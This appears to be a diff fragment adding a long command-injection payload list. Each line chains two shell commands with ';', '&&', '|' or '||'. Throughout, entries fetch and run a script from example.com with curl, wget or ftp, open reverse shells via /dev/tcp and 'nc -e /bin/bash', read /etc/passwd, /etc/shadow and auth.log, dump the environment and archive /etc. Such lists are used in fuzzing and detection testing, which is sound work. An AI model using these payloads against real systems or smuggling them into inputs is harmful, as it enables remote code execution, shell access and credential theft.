+ssh localhost id ; /bin/echo pwned > /tmp/pwned.txt
+ssh localhost id && /bin/echo pwned > /tmp/pwned.txt
+ssh localhost id | /bin/echo pwned > /tmp/pwned.txt
+ssh localhost id || /bin/echo pwned > /tmp/pwned.txt
+ssh localhost id ; /usr/bin/printf 'pwned\n'
+ssh localhost id && /usr/bin/printf 'pwned\n'
+ssh localhost id | /usr/bin/printf 'pwned\n'
+ssh localhost id || /usr/bin/printf 'pwned\n'
+ssh localhost id ; chmod +x /tmp/pwned
+ssh localhost id && chmod +x /tmp/pwned
+ssh localhost id | chmod +x /tmp/pwned
+ssh localhost id || chmod +x /tmp/pwned
+ssh localhost id ; tar -cf /tmp/dump.tar /etc
+ssh localhost id && tar -cf /tmp/dump.tar /etc
+ssh localhost id | tar -cf /tmp/dump.tar /etc
+ssh localhost id || tar -cf /tmp/dump.tar /etc
+ssh localhost id ; openssl s_client -connect example.com:443
+ssh localhost id && openssl s_client -connect example.com:443
+ssh localhost id | openssl s_client -connect example.com:443
+ssh localhost id || openssl s_client -connect example.com:443
+ssh localhost id ; ssh localhost id
+ssh localhost id && ssh localhost id
+ssh localhost id | ssh localhost id
+ssh localhost id || ssh localhost id
+ssh localhost id ; ftp http://example.com/pwn.sh
+ssh localhost id && ftp http://example.com/pwn.sh
+ssh localhost id | ftp http://example.com/pwn.sh
+ssh localhost id || ftp http://example.com/pwn.sh
+ftp http://example.com/pwn.sh ; id
+ftp http://example.com/pwn.sh && id
+ftp http://example.com/pwn.sh | id
+ftp http://example.com/pwn.sh || id
+ftp http://example.com/pwn.sh ; uname -a
+ftp http://example.com/pwn.sh && uname -a
+ftp http://example.com/pwn.sh | uname -a
+ftp http://example.com/pwn.sh || uname -a
+ftp http://example.com/pwn.sh ; whoami
+ftp http://example.com/pwn.sh && whoami
+ftp http://example.com/pwn.sh | whoami
+ftp http://example.com/pwn.sh || whoami
+ftp http://example.com/pwn.sh ; ls -la /
+ftp http://example.com/pwn.sh && ls -la /
+ftp http://example.com/pwn.sh | ls -la /
+ftp http://example.com/pwn.sh || ls -la /
+ftp http://example.com/pwn.sh ; ls -la /etc
+ftp http://example.com/pwn.sh && ls -la /etc
+ftp http://example.com/pwn.sh | ls -la /etc
+ftp http://example.com/pwn.sh || ls -la /etc
+ftp http://example.com/pwn.sh ; ls -lha /root
+ftp http://example.com/pwn.sh && ls -lha /root
+ftp http://example.com/pwn.sh | ls -lha /root
+ftp http://example.com/pwn.sh || ls -lha /root
+ftp http://example.com/pwn.sh ; cat /etc/passwd
+ftp http://example.com/pwn.sh && cat /etc/passwd
+ftp http://example.com/pwn.sh | cat /etc/passwd
+ftp http://example.com/pwn.sh || cat /etc/passwd
+ftp http://example.com/pwn.sh ; cat /etc/shadow
+ftp http://example.com/pwn.sh && cat /etc/shadow
+ftp http://example.com/pwn.sh | cat /etc/shadow
+ftp http://example.com/pwn.sh || cat /etc/shadow
+ftp http://example.com/pwn.sh ; cat /etc/hosts
+ftp http://example.com/pwn.sh && cat /etc/hosts
+ftp http://example.com/pwn.sh | cat /etc/hosts
+ftp http://example.com/pwn.sh || cat /etc/hosts
+ftp http://example.com/pwn.sh ; cat /var/log/auth.log
+ftp http://example.com/pwn.sh && cat /var/log/auth.log
+ftp http://example.com/pwn.sh | cat /var/log/auth.log
+ftp http://example.com/pwn.sh || cat /var/log/auth.log
+ftp http://example.com/pwn.sh ; env
+ftp http://example.com/pwn.sh && env
+ftp http://example.com/pwn.sh | env
+ftp http://example.com/pwn.sh || env
+ftp http://example.com/pwn.sh ; ps aux
+ftp http://example.com/pwn.sh && ps aux
+ftp http://example.com/pwn.sh | ps aux
+ftp http://example.com/pwn.sh || ps aux
+ftp http://example.com/pwn.sh ; netstat -tulnp
+ftp http://example.com/pwn.sh && netstat -tulnp
+ftp http://example.com/pwn.sh | netstat -tulnp
+ftp http://example.com/pwn.sh || netstat -tulnp
+ftp http://example.com/pwn.sh ; mtr -r 127.0.0.1 -c 1
+ftp http://example.com/pwn.sh && mtr -r 127.0.0.1 -c 1
+ftp http://example.com/pwn.sh | mtr -r 127.0.0.1 -c 1
+ftp http://example.com/pwn.sh || mtr -r 127.0.0.1 -c 1
+ftp http://example.com/pwn.sh ; curl http://example.com/pwn.sh | sh
+ftp http://example.com/pwn.sh && curl http://example.com/pwn.sh | sh
+ftp http://example.com/pwn.sh | curl http://example.com/pwn.sh | sh
+ftp http://example.com/pwn.sh || curl http://example.com/pwn.sh | sh
+ftp http://example.com/pwn.sh ; wget http://example.com/pwn.sh -O- | sh
+ftp http://example.com/pwn.sh && wget http://example.com/pwn.sh -O- | sh
+ftp http://example.com/pwn.sh | wget http://example.com/pwn.sh -O- | sh
+ftp http://example.com/pwn.sh || wget http://example.com/pwn.sh -O- | sh
+ftp http://example.com/pwn.sh ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ftp http://example.com/pwn.sh && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ftp http://example.com/pwn.sh | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ftp http://example.com/pwn.sh || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ftp http://example.com/pwn.sh ; nc 127.0.0.1 4444 -e /bin/bash
+ftp http://example.com/pwn.sh && nc 127.0.0.1 4444 -e /bin/bash
+ftp http://example.com/pwn.sh | nc 127.0.0.1 4444 -e /bin/bash
+ftp http://example.com/pwn.sh || nc 127.0.0.1 4444 -e /bin/bash
+ftp http://example.com/pwn.sh ; python -c 'import os;print(os.listdir("/"))'
+ftp http://example.com/pwn.sh && python -c 'import os;print(os.listdir("/"))'
+ftp http://example.com/pwn.sh | python -c 'import os;print(os.listdir("/"))'
+ftp http://example.com/pwn.sh || python -c 'import os;print(os.listdir("/"))'
+ftp http://example.com/pwn.sh ; perl -e 'print "pwned"'
+ftp http://example.com/pwn.sh && perl -e 'print "pwned"'
+ftp http://example.com/pwn.sh | perl -e 'print "pwned"'
+ftp http://example.com/pwn.sh || perl -e 'print "pwned"'
+ftp http://example.com/pwn.sh ; php -r 'system("id");'
+ftp http://example.com/pwn.sh && php -r 'system("id");'
+ftp http://example.com/pwn.sh | php -r 'system("id");'
+ftp http://example.com/pwn.sh || php -r 'system("id");'
+ftp http://example.com/pwn.sh ; ruby -e 'puts `id`'
+ftp http://example.com/pwn.sh && ruby -e 'puts `id`'
+ftp http://example.com/pwn.sh | ruby -e 'puts `id`'
+ftp http://example.com/pwn.sh || ruby -e 'puts `id`'
+ftp http://example.com/pwn.sh ; /bin/bash -c 'id'
+ftp http://example.com/pwn.sh && /bin/bash -c 'id'
+ftp http://example.com/pwn.sh | /bin/bash -c 'id'
+ftp http://example.com/pwn.sh || /bin/bash -c 'id'
+ftp http://example.com/pwn.sh ; /usr/bin/id >/tmp/id.txt
+ftp http://example.com/pwn.sh && /usr/bin/id >/tmp/id.txt
+ftp http://example.com/pwn.sh | /usr/bin/id >/tmp/id.txt
+ftp http://example.com/pwn.sh || /usr/bin/id >/tmp/id.txt
+ftp http://example.com/pwn.sh ; /bin/echo pwned > /tmp/pwned.txt
+ftp http://example.com/pwn.sh && /bin/echo pwned > /tmp/pwned.txt
+ftp http://example.com/pwn.sh | /bin/echo pwned > /tmp/pwned.txt
+ftp http://example.com/pwn.sh || /bin/echo pwned > /tmp/pwned.txt
+ftp http://example.com/pwn.sh ; /usr/bin/printf 'pwned\n'
+ftp http://example.com/pwn.sh && /usr/bin/printf 'pwned\n'
+ftp http://example.com/pwn.sh | /usr/bin/printf 'pwned\n'
+ftp http://example.com/pwn.sh || /usr/bin/printf 'pwned\n'
+ftp http://example.com/pwn.sh ; chmod +x /tmp/pwned
+ftp http://example.com/pwn.sh && chmod +x /tmp/pwned
+ftp http://example.com/pwn.sh | chmod +x /tmp/pwned
+ftp http://example.com/pwn.sh || chmod +x /tmp/pwned
+ftp http://example.com/pwn.sh ; tar -cf /tmp/dump.tar /etc
+ftp http://example.com/pwn.sh && tar -cf /tmp/dump.tar /etc
+ftp http://example.com/pwn.sh | tar -cf /tmp/dump.tar /etc
+ftp http://example.com/pwn.sh || tar -cf /tmp/dump.tar /etc
+ftp http://example.com/pwn.sh ; openssl s_client -connect example.com:443
+ftp http://example.com/pwn.sh && openssl s_client -connect example.com:443
+ftp http://example.com/pwn.sh | openssl s_client -connect example.com:443
+ftp http://example.com/pwn.sh || openssl s_client -connect example.com:443
+ftp http://example.com/pwn.sh ; ssh localhost id
+ftp http://example.com/pwn.sh && ssh localhost id
+ftp http://example.com/pwn.sh | ssh localhost id
+ftp http://example.com/pwn.sh || ssh localhost id
+ftp http://example.com/pwn.sh ; ftp http://example.com/pwn.sh
+ftp http://example.com/pwn.sh && ftp http://example.com/pwn.sh
+ftp http://example.com/pwn.sh | ftp http://example.com/pwn.sh
+ftp http://example.com/pwn.sh || ftp http://example.com/pwn.sh
